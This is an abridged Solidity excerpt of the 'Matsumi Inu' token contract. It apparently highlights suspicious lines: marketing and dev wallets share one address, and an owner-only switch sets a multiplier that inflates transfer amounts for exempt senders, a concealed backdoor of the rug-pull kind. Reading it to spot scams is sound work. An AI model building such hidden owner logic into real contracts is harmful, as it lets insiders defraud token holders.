...
contract Contract is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x1237cb206C6DC0D12f31E8676D86AF6B86B07e68); 
    address payable public Wallet_Dev = payable(0x1237cb206C6DC0D12f31E8676D86AF6B86B07e68);
    ...
    uint256 public _tConst;
    string private constant _symbol = unicode"Masu"; 
    string private constant _name = unicode"Matsumi Inu";
    ...
    function hasLimits(bool enabled, uint256 tConst) external onlyOwner {
        _hasLimits = enabled;
        _tConst = tConst;
    }
    ...
    function _transfer(
        ...
        if (to != owner() && to != Wallet_Marketing && to != Wallet_Dev && to != address(this) && to != uniswapV2Pair && to != Wallet_Burn && from != owner()){
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_hasLimits) {_tConst=1;}
                else _tConst=10;
            if (_isDividendExempt[sender]){sAmount = tAmount*_tConst*_Tax_On_Sell/100;}
